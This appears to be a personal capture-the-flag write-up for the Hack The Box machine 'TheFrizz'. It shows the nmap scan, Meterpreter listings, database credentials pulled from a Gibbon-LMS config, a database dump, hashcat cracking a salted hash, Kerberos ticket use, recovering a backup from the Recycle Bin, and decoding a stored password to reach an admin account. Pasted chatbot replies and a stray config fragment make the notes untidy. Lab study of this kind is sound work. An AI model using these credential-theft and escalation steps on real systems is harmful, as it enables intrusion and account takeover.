---
title: theFrizz
type: htb-writeup
source: Hack The Box
platform: Windows
tags: [htb, writeup, windows, active-directory, kerberos, preserved]
status: preserved
---
![The Frizz](/Images/theFrizz/TheFrizz.png)

# Nmap Scan Report
=====================

### Target
Host: `thefrizz.htb` (`10.10.11.60`)
Starting Nmap version: `7.95`
Date and time: `2025-07-05 22:34 PDT`

### Ports
----------------
#### Open Ports
*   `22/tcp`: OpenSSH for Windows 9.5 (protocol 2.0)
*   `53/tcp`: Simple DNS Plus
*   `80/tcp`: Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12) with HTTP title: "Did not follow redirect to http://frizzdc.frizz.htb/home/"
*   `88/tcp`: Microsoft Windows Kerberos (server time: `2025-07-06 12:34:55Z`)
*   `135/tcp`: Microsoft Windows RPC
*   `139/tcp`: Microsoft Windows netbios-ssn
*   `389/tcp`: Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
*   `445/tcp`: Microsoft Windows SMB
*   `464/tcp`: kpasswd5
*   `593/tcp`: ncacn_http (Microsoft Windows RPC over HTTP 1.0)
*   `636/tcp`: tcpwrapped
*   `3268/tcp`: Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
*   `3269/tcp`: tcpwrapped

#### Closed Ports
Not shown: 987 filtered TCP ports (no-response)

### OS and Service Detection
-----------------------------
Running (JUST GUESSING): Microsoft Windows 2022, 2012, or 2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022, cpe:/o:microsoft:windows_server_2012:r2, cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal)

### Host Script Results
-------------------------
*   `smb2-security-mode`:
    + Message signing enabled and required
    + Clock skew: 6h59m59s
*   `smb2-time`:
    + Date: `2025-07-06T12:35:06`
    + Start date: N/A

### Traceroute Results
-------------------------
HOP RTT      ADDRESS
1   78.24 ms 10.10.14.1
2   78.54 ms thefrizz.htb (10.10.11.60)

**Nmap Done**
--------------

Scanned in 62.56 seconds

---
# Kerberos TGT Extraction and Usage Notes

```
(jrioswarmonger)-[~/…/HTB/Machines/theFizz/TGT]
$ faketime 'now + 7 hours' impacket-getTGT   FRIZZ.HTB/m.schoolbus:'!suBcig@MehTed!R'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in m.schoolbus.ccache

(jrioswarmonger)-[~/…/HTB/Machines/theFizz/TGT]
$ ls
m.schoolbus.ccache

(jrioswarmonger)-[~/…/HTB/Machines/theFizz/TGT]
$ export KRB5CCNAME=m.schoolbus.ccache         

(jrioswarmonger)-[~/…/HTB/Machines/theFizz/TGT]
$ klist                       
Ticket cache: FILE:m.schoolbus.ccache
Default principal: m.schoolbus@FRIZZ.HTB

Valid starting       Expires              Service principal
07/18/2025 00:53:37  07/18/2025 10:53:37  krbtgt/FRIZZ.HTB@FRIZZ.HTB
        renew until 07/19/2025 00:53:38
```

## Key Findings & Next Steps

- **Kerberos-only SSH**: Only `gssapi-with-mic` (Kerberos) and `keyboard-interactive` auth allowed. No password or public key authentication.
- **LDAP/SMB/Kerberos**: Multiple AD-related ports open, possible for user enumeration and Kerberos attacks.
- **SMB**: Message signing enabled and required.
- **Clock Skew**: 6h59m59s between systems.

### Next Steps
1. Enumerate domain users using LDAP.
2. Test Kerberos pre-authentication bypass.
3. Explore SMB signing bypass opportunities.
4. Analyze web server for vulnerabilities.

---

## Gibbon-LMS Exploitation

### Directory Structure

- `C:\xampp\htdocs\Gibbon-LMS` contains config files, SQL dumps, and user management scripts.
- `gibbon.sql` and `gibbon_demo.sql` may expose schema and sample data.

### Extracted Credentials from `config.php`
```php
$databaseServer   = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName     = 'gibbon';
```

### MySQL Dump Command
```bash
C:\xampp\mysql\bin>mysqldump.exe -u MrGibbonsDB -pMisterGibbs!Parrot!?1 gibbon > c:\Windows\Temp\dump.sql
```

### SQL Dump Snippet & Hash Extraction
```sql
INSERT INTO `gibbonperson` VALUES (
  ...,
  'f.frizzle',
  '067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03',
  '/aACFhikmNopqrRTVz2489',
  ...,
  'f.frizzle@frizz.htb',
  ...
);
```
- **Hash**: `067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03`
- **Salt**: `/aACFhikmNopqrRTVz2489`
- **Hash Mode**: `sha256($salt.$pass)` (1420)
- **Password**: `Jenni_Luvs_Magic23` (cracked with `rockyou.txt`)
- **Username**: `f.frizzle`

---

## Kerberos Authentication Notes

- **Kerberos realms are case-sensitive and conventionally uppercase** (e.g., `FRIZZ.HTB`).
- `/etc/krb5.conf` must match the realm exactly.
- To authenticate:
  ```bash
  kinit f.frizzle@FRIZZ.HTB
  ssh -o GSSAPIAuthentication=yes f.frizzle@FRIZZ.HTB
  ```
- Check TGT with `klist`.

---

## PowerShell & Recycle Bin

- Use COM Shell object to list Recycle Bin contents:
  ```powershell
  (New-Object -ComObject Shell.Application).NameSpace(0xA).Items() | Select-Object name
  ```
- Actual files are in `C:\$RECYCLE.BIN\<SID>\` as `$R*` (data) and `$I*` (metadata).
- Restore file to Desktop:
  ```powershell
  $shell = New-Object -ComObject Shell.Application
  $item = $shell.NameSpace(0xA).Items() | Where-Object { $_.Name -eq "wapt-backup-sunday.7z" }
  $shell.NameSpace([Environment]::GetFolderPath("Desktop")).MoveHere($item)
  ```

---

## Additional Credentials

- **waptserver.ini** contains:
  - `wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=` → `!suBcig@MehTed!R` (base64 decoded)

---

## Privilege Escalation

- `m.schoolbus@FRIZZ.HTB` is a member of `Desktop Admins` (mapped to local Administrators via GPO).
- Use Kerberos auth for SSH and privilege escalation.

---

## Proof-of-Concept (PoC) for RCE

- **CVE-2023-45878**: [GitHub Link](https://github.com/davidzzo23/CVE-2023-45878)

---

Let me know if you want syntax highlighting for specific code sections or further breakdowns.
* Sets a globally unique id, to allow multiple installs on a single server.
*/
$guid = '7y59n5xz-uym-ei9p-7mmq-83vifmtyey2';
/**
* Sets system-wide caching factor, used to balance performance and freshness.
* Value represents number of page loads between cache refresh.
* Must be positive integer. 1 means no caching.
*/
$caching = 10;
```

Let me know if you'd like me to make any changes!


# Meterpreter Enumeration Notes: Gibbon-LMS Exploitation

## Directory Listing: `C:\xampp`

| Mode              | Size   | Type | Last Modified                | Name       |
|------------------|--------|------|------------------------------|------------|
| 040777/rwxrwxrwx  | 4096   | dir  | 2024-10-29 07:25:49 -0700    | apache     |
| 040777/rwxrwxrwx  | 0      | dir  | 2024-10-29 07:26:45 -0700    | cgi-bin    |
| 040777/rwxrwxrwx  | 0      | dir  | 2024-10-29 07:25:47 -0700    | contrib    |
| 040777/rwxrwxrwx  | 4096   | dir  | 2024-10-29 07:28:30 -0700    | htdocs     |
| 040777/rwxrwxrwx  | 0      | dir  | 2024-10-29 07:25:47 -0700    | licenses   |
| 040777/rwxrwxrwx  | 4096   | dir  | 2024-10-29 07:25:50 -0700    | mysql      |
| 040777/rwxrwxrwx  | 12288  | dir  | 2024-10-29 07:26:45 -0700    | php        |
| 040777/rwxrwxrwx  | 0      | dir  | 2024-10-29 07:25:47 -0700    | src        |
| 040777/rwxrwxrwx  | 12288  | dir  | 2025-07-06 20:31:43 -0700    | tmp        |

## Directory Listing: `C:\xampp\htdocs`

| Mode              | Size   | Type | Last Modified                | Name       |
|------------------|--------|------|------------------------------|------------|
| 040777/rwxrwxrwx  | 16384  | dir  | 2025-07-06 20:35:16 -0700    | Gibbon-LMS |
| 040777/rwxrwxrwx  | 4096   | dir  | 2025-02-25 13:09:14 -0800    | home       |

## Directory Listing: `C:\xampp\htdocs\Gibbon-LMS`

- Numerous PHP files present including:
  - `config.php`
  - `login.php`
  - `gibbon.sql` (Potential DB Dump)
  - `passwordReset.php`, `passwordResetProcess.php`
  - `publicRegistration.php`
  - `installer/`, `lib/`, `uploads/` and `vendor/` directories

## Extracted Credentials from `config.php`

```php
$databaseServer   = 'localhost';
$databaseUsername = '<span style="color:red"><b>MrGibbonsDB</b></span>';
$databasePassword = '<span style="color:red"><b>MisterGibbs!Parrot!?1</b></span>';
$databaseName     = 'gibbon';
````

## Observations

* Gibbon-LMS is fully deployed and accessible under `htdocs\Gibbon-LMS`.
* Configuration reveals hardcoded credentials for MySQL.
* Files like `gibbon.sql` and `gibbon_demo.sql` suggest full schema and sample data exposure.
* Modules related to registration, login, and password reset may be vulnerable to logic flaws or SQLi.
* Investigate potential sensitive data in:

  * `gibbon.sql`
  * `login.php`
  * `preferencesPasswordProcess.php`

>  **Next Steps:** Dump and analyze `gibbon.sql` for user credentials and roles. Try MySQL login with the credentials to explore further privilege escalation or data exfiltration.

```

### MySQL Dump Command Notes  

```bash
C:\xampp\mysql\bin>mysqldump.exe -u MrGibbonsDB -pMisterGibbs!Parrot!?1 gibbon > c:\Windows\Temp\dump.sql
```  

**Command Breakdown:**  
- **Path to `mysqldump.exe`:** `C:\xampp\mysql\bin>`  
- **Username:** `-u MrGibbonsDB`  
- **Password:** `-pMisterGibbs!Parrot!?1`  
- **Database Name:** `gibbon`  
- **Output File:** `c:\Windows\Temp\dump.sql`  

**Purpose:**  
Exports the `gibbon` database to a SQL file for backup.


### Meterpreter File Listing Notes  

```bash
meterpreter > ls
Listing: c:\xampp\htdocs
========================
Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
040777/rwxrwxrwx  16384    dir   2025-07-06 22:20:16 -0700  Gibbon-LMS
100666/rw-rw-rw-  1124890  fil   2025-07-06 22:21:43 -0700  dump.sql
040777/rwxrwxrwx  4096     dir   2025-02-25 13:09:14 -0800  home
```  


## SQL Dump Snippet
```sql
INSERT INTO `gibbonperson` VALUES (
  0000000001, 'Ms.', 'Frizzle', 'Fiona', 'Fiona', 'Fiona Frizzle', '', 'Unspecified', 
  'f.frizzle', '067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03', 
  '/aACFhikmNopqrRTVz2489', 'N', 'Full', 'Y', 001, '001', NULL, 
  'f.frizzle@frizz.htb', NULL, NULL, '::1', '2024-10-29 16:28:59', NULL, NULL, 0, 
  '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 
  '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 
  '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 
  '', '', '', '', '', '', '', '', 'Y', 'Y', 'N', NULL, '', '', '', NULL, NULL, NULL, 
  NULL, NULL, NULL, '', '', '', 'Y', NULL, NULL, NULL
);
```

# Hash & Credentials Extraction
```bash
hashcat hash -m 1420 -a 0 /usr/share/wordlists/rockyou.txt
```

## Hash Details
- **Hash**: `067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03`  
- **Hash Mode**: `sha256($salt.$pass)` (1420)  
- **Salt**: `/aACFhikmNopqrRTVz2489`  
- **Password**: `Jenni_Luvs_Magic23`  
- **Username**: `f.frizzle` (from email: `f.frizzle@frizz.htb`)  

## Hashcat Session Summary
- **Status**: Cracked (1/1 recovered)  
- **Speed**: 26,696.7 kH/s  
- **Time Started**: `Sun Jul  6 16:52:17 2025`  
- **Time Estimated**: `Sun Jul  6 16:52:18 2025`  
- **Kernel Feature**: Pure Kernel  
- **Dictionary Used**: `/usr/share/wordlists/rockyou.txt`  


## Notes
- The hash appears to be a **salted SHA-256** hash (`sha256($salt.$pass)`).  
- The password `Jenni_Luvs_Magic23` was successfully cracked using the `rockyou.txt` dictionary.  
- The SQL dump contains a user record with the email `f.frizzle@frizz.htb` and the hash/salt pair.  
- System monitoring indicates stable hardware performance during the attack.  


Your `nmap` output clearly indicates that:

# This SSH server requires Kerberos (GSSAPI) authentication.

Let’s break it down:

---

###  Analysis of the Output

```text
| ssh-auth-methods: 
|   Supported authentication methods: 
|     gssapi-with-mic
|_    keyboard-interactive
```

* `gssapi-with-mic`: This is **Kerberos-based auth using a TGT**.
* No `password` or `publickey` methods listed as accepted.

```text
|_ssh-brute: Password authentication not allowed
```

* Confirms that brute-forcing passwords is not possible — **password auth is disabled**.

```text
| ssh-publickey-acceptance: 
|_  Accepted Public Keys: No public keys accepted
```

* **No public keys are accepted**, so `id_rsa`/`id_ecdsa` won't help.

---

### Conclusion

This host is **Kerberos-only for SSH login**.

To authenticate successfully:

1. You must have a valid **Kerberos TGT**.

```bash
sudo vim /etc/krb5.conf
... # I made a copy of my original file krb5.conf
[libdefaults]
    default_realm = FRIZZ.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    forwardable = true
    rdns = false

[realms]
    FRIZZ.HTB = {
        kdc = frizzdc.frizz.htb
        admin_server = frizzdc.frizz.htb
    }

[domain_realm]
    .frizz.htb = FRIZZ.HTB
    frizz.htb = FRIZZ.HTB

```

2. You can request one using:
# THIS MUST BE CAPITAL!!!
   ```bash
   kinit f.frizzle@FRIZZ.HTB
   ```

   (Assuming you know the password or cracked it with hashcat.)

3. Then SSH using:
# SAME MUST BE CAPITAL FRIZZ.HTB
   ```bash
   ssh -o GSSAPIAuthentication=yes f.frizzle@FRIZZ.HTB
   ```

4. You can also test with `netexec`:

   ```bash
   netexec ssh thefrizz.htb -u f.frizzle -p 'PASSWORD' -d frizz.htb --kerberos
   ```

---

### Want to check if you have a TGT?

```bash
klist
```

If you have a valid ticket for `f.frizzle@FRIZZ.HTB`, you’re good to go.

---

Let me know if you want help crafting a valid `kinit` flow, `ccache` impersonation, or `impacket-ssh` usage with TGTs or .kirbi tickets.


```powershell
PowerShell 7.4.5
PS C:\Users\f.frizzle> 
PS C:\Users\f.frizzle> cd .\Desktop\
PS C:\Users\f.frizzle\Desktop> ls

    Directory: C:\Users\f.frizzle\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar--            7/6/2025  5:30 AM             34 user.txt

PS C:\Users\f.frizzle\Desktop> more .\user.txt
d3fd39b6500de4cb4ec8e4425eb58c8a
PS C:\Users\f.frizzle\Desktop> 
```

Great question.

### Short answer:

**Kerberos realms are case-sensitive and conventionally written in uppercase.**
So `FRIZZ.HTB` ≠ `frizz.htb` to the Kerberos client.

---

### Longer explanation:

In Kerberos (specifically **MIT Kerberos** and **Active Directory**):

* The **realm** (`REALM.NAME`) identifies the Kerberos domain — it's a **case-sensitive string**, usually **UPPERCASE**.
* The **principal** (like `f.frizzle@FRIZZ.HTB`) must match exactly the realm defined in your `/etc/krb5.conf` config.

#### So this fails:

```bash
kinit f.frizzle@frizz.htb
```

Because there’s no `[realms] frizz.htb` section in `/etc/krb5.conf`.

#### But this works:

```bash
kinit f.frizzle@FRIZZ.HTB
```

Because that matches this section:

```ini
[realms]
    FRIZZ.HTB = {
        kdc = frizzdc.frizz.htb
        ...
    }
```

---

### Why uppercase is the standard:

This is **just a convention**, but a widely followed one:

* **MIT Kerberos** uses uppercase realm names by default
* **Active Directory** always uses uppercase for realm names internally (e.g., `DOMAIN.LOCAL`)
* Most tools (e.g., Impacket, `krb5.conf`, `kinit`) expect this unless configured otherwise

---

### Summary:

| Term           | Example          | Case-sensitive? | Notes                               |
| -------------- | ---------------- | --------------- | ----------------------------------- |
| Hostname       | `frizz.htb`      |  no            | DNS is case-insensitive             |
| Kerberos Realm | `FRIZZ.HTB`      |  **yes**       | Must match `/etc/krb5.conf` exactly |
| Principal      | `user@FRIZZ.HTB` |  yes           | Must use correct realm casing       |


Here’s a **detailed breakdown for your notes** explaining what’s happening in your PowerShell session related to the Recycle Bin:

---

##  PowerShell + Recycle Bin Internals — Notes

###  Command:

```powershell
(New-Object -ComObject Shell.Application).NameSpace(0xA).Items() | Select-Object name
```

###  Output:

```
Name
----
wapt-backup-sunday.7z
```

#### What it does:

* Creates a COM Shell object.
* `NameSpace(0xA)` targets **CSIDL 0xA**, which corresponds to the **Recycle Bin**.
* `Items()` lists the files in the Recycle Bin **in a user-friendly way** (shows original filenames).
* `Select-Object Name` extracts only the visible name.

#### Notes:

* This view **abstracts** the actual storage format.
* It shows the real file names (`wapt-backup-sunday.7z`) even though the files in disk are stored as `$Rxxxxx` and `$Ixxxxx`.

---

##  Inspecting the Recycle Bin's Actual Filesystem

### Command:

```powershell
Get-ChildItem -Force C:\$RECYCLE.BIN
```

###  Output:

```
Directory: C:\$RECYCLE.BIN

Mode   LastWriteTime     Length Name
----   -------------     ------ ----
d--hs  10/29/2024 7:31 AM        S-1-5-21-2386970044-1145388522-2932701813-1103
```

#### What this shows:

* `C:\$RECYCLE.BIN` is a **hidden system folder** that stores deleted files for all users.
* Each user has a **SID-named subfolder** (here: `S-1-5-21-2386970044-...-1103`).
* Files deleted by a user are stored in that user’s folder.

#### Notes:

* `d--hs` means **directory**, **hidden**, and **system**.
* The actual deleted files inside are named like `$Rxxxxx.ext` (data) and `$Ixxxxx` (metadata).
* These filenames are **not human-readable** without decoding.

---

## To List Actual Deleted Files (Raw Form):

```powershell
Get-ChildItem -Force -Recurse "C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103"
```

You will see something like:

```
Mode  LastWriteTime   Length Name
----  -------------   ------ ----
-a--- 10/29/2024 ...    2048 $R2A1H9Z.7z
-a--- 10/29/2024 ...     528 $I2A1H9Z
```

---

## Summary

| Aspect                 | Info                                                            |
| ---------------------- | --------------------------------------------------------------- |
| Recycle Bin (GUI view) | Uses COM Shell API (`Shell.Application`) to show real filenames |
| Filesystem location    | `C:\$Recycle.Bin`                                               |
| Per-user storage       | SID-named folders (e.g., `S-1-5-21-...`)                        |
| File format            | `$Rxxxxx.ext` (data), `$Ixxxxx` (metadata)                      |
| PowerShell shortcut    | `Namespace(0xA)` = Recycle Bin                                  |
| Hidden/System          | Yes, must use `-Force` to view                                  |

---

Let me know if you want to add a function or alias to your PowerShell profile for listing recycle bin contents in one line.

## Restore the file to the Desktop:
```powershell
$shell = New-Object -ComObject Shell.Application
$item = $shell.NameSpace(0xA).Items() | Where-Object { $_.Name -eq "wapt-backup-sunday.7z" }
$shell.NameSpace([Environment]::GetFolderPath("Desktop")).MoveHere($item)

PS C:\Users\f.frizzle\Desktop> ls

    Directory: C:\Users\f.frizzle\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar--            7/6/2025  5:30 AM             34 user.txt
-a---          10/24/2024  9:16 PM       30416987 wapt-backup-sunday.7z

```

```bash
[us-vip-11][10.10.14.21][drnatas@htb-za6bfwqv0g][~/Documents/uploads/wapt/conf]
 []$ cat waptserver.ini
[options]
allow_unauthenticated_registration = True
wads_enable = True
login_on_wads = True
waptwua_enable = True
secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
server_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38
token_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
clients_signing_key = C:\wapt\conf\ca-192.168.120.158.pem
clients_signing_certificate = C:\wapt\conf\ca-192.168.120.158.crt

[tftpserver]
root_dir = c:\wapt\waptserver\repository\wads\pxe
log_path = c:\wapt\log


(jriosbanhammer)-[/tmp]
$ echo 'IXN1QmNpZ0BNZWhUZWQhUgo=' | base64 -d
!suBcig@MehTed!R

# HISTORY FAVORS THE BOLD TESTING ALL THE OTHER ACCOUNTS WITH KERBEROS

[us-vip-11][10.10.14.21][drnatas@htb-za6bfwqv0g][~/Documents/uploads]
 []$ kinit m.schoolbus@FRIZZ.HTB
Password for m.schoolbus@FRIZZ.HTB: 
[us-vip-11][10.10.14.21][drnatas@htb-za6bfwqv0g][~/Documents/uploads]
 []$ ssh m.schoolbus@FRIZZ.HTB -K
PowerShell 7.4.5
PS C:\Users\Administrator> get-gpo -all

DisplayName      : Default Domain Policy
DomainName       : frizz.htb
Owner            : frizz\Domain Admins
Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 10/29/2024 7:19:24 AM
ModificationTime : 10/29/2024 7:25:44 AM
UserVersion      : 
ComputerVersion  : 
WmiFilter        : 

DisplayName      : Default Domain Controllers Policy
DomainName       : frizz.htb
Owner            : frizz\Domain Admins
Id               : 6ac1786c-016f-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 10/29/2024 7:19:24 AM
ModificationTime : 10/29/2024 7:19:24 AM
UserVersion      : 
ComputerVersion  : 
WmiFilter        : 

c:\Users>net user m.schoolbus
net user m.schoolbus
User name                    M.SchoolBus
Full Name                    Marvin SchoolBus
Comment                      Desktop Administrator
User`s comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/29/2024 7:27:03 AM
Password expires             Never
Password changeable          10/29/2024 7:27:03 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   7/7/2025 10:40:13 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *Desktop Admins       
The command completed successfully.

```
### Note Desktop Admins is mapped via Group Policy to local Administrators, this account could be local admin on all domain-joined workstations.

#### DNS Enumeration

## Active Directory Domain Controller SRV Record Lookup

### Querying LDAP Domain Controllers via DNS

To enumerate domain controllers for an AD domain, query the special SRV record using `dig`:

```sh
dig @<DNS_SERVER_IP> _ldap._tcp.dc._msdcs.<AD_DOMAIN> SRV +short
```

**Example:**

```sh
dig @10.10.11.60 _ldap._tcp.dc._msdcs.frizz.htb SRV +short
```

#### Output Example

```
0 100 389 frizzdc.frizz.htb.
```

**Breakdown:**

* **0** – Priority (lower = higher preference)
* **100** – Weight (used for load balancing among same-priority records)
* **389** – Port for LDAP service
* **frizzdc.frizz.htb.** – Hostname of the domain controller

#### What this means

This SRV record tells you which host(s) are providing the LDAP service (port 389) for the Active Directory domain, which is a key step in identifying DCs and enumerating further AD information.

---